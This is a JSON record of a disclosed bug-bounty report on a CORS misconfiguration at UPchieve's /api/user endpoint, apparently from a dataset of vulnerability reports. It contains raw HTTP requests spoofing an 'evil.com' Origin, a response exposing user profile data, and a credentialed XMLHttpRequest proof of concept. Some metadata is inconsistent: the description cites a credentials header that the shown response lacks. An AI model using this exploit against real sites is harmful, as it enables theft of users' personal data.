@@ -1,0 +1,38 @@
+{
+    "reported_to": "UPchieve",
+    "reported_by": "n1had ",
+    "title": "Cross-origin resource sharing misconfig | steal user information ",
+    "content": "\nSummary\nAn HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.\nPOC1\nRuquested .\n1-\nCode 243 Bytes\n1\n2GET /api/user HTTP/1.1\n3Host: app.upchieve.org\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0\n5Accept: application/json, text/plain, */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8\n2- we can add Origin: evil.com\nCode 259 Bytes\n1\n2GET /api/user HTTP/1.1\n3Host: app.upchieve.org\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0\n5Accept: application/json, text/plain, */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Origin: evil.com\nResponse\nCode 720 Bytes\n1\n2HTTP/1.1 200 OK\n3Date: Tue, 04 May 2021 11:21:25 GMT\n4Content-Type: application/json; charset=utf-8\n5Connection: close\n6x-powered-by: Express\n7access-control-allow-origin: evil.com\n8\n9\n10{\"user\":{\"_id\":\"6088429736785e00232c57de\",\"verified\":true,\"verifiedEmail\":true,\"verifiedPhone\":false,\"isVolunteer\":false,\"isAdmin\":false,\"isBanned\":true,\"isTestUser\":false,\"isFakeUser\":false,\"isDeactivated\":false,\"pastSessions\":[\"609069b08b925400233afeb7\"],\"type\":\"Student\",\"firstname\":\"sfsf\",\"lastname\":\"dfe\",\"email\":\"2c5a43ddb7@firemailbox.club\",\"zipCode\":\"77777\",\"approvedHighschool\":\"5f6273fa7674f035e46b6af0\",\"createdAt\":\"2021-04-27T16:57:59.882Z\",\"lastActivityAt\":\"2021-05-03T21:22:08.243Z\",\"referralCode\":\"YIhClzZ4XgAjLFfe\",\"__v\":0}}\n11\nPOC2\n1- open https://example.com in browser then inspect the page and go to console.\n2- run the following code in console and you would find it pops up user information\nCode 249 Bytes\n1\n2<html>\n3<script>\n4var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://app.upchieve.org/api/user',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n5</script>\n6</html>\n7\nOpen above code in any browser and you would find it pops up user information like the attachment.\nHow To Fix\nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\nImpact\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Information Disclosure"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1623790680,
+    "report_url": "https://hackerone.com/reports/1183601",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a GET request to /api/user with an added Origin header set to a malicious domain (e.g., evil.com)."
+        ],
+        [
+            2,
+            "Observe that the server responds with Access-Control-Allow-Origin: evil.com, indicating improper CORS configuration, and includes sensitive user data in the response."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a misconfiguration in Cross-Origin Resource Sharing (CORS) policy that allows arbitrary origins to access sensitive user information. The server incorrectly reflects the Origin header in the Access-Control-Allow-Origin response header and includes Access-Control-Allow-Credentials: true, enabling cross-origin requests to retrieve authenticated user data.",
+    "reason": "The attack involves a straightforward manipulation of HTTP headers to exploit a common CORS misconfiguration. It does not require complex interactions between multiple components or understanding of subtle application logic. The vulnerability is well-documented and frequently encountered in web applications.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
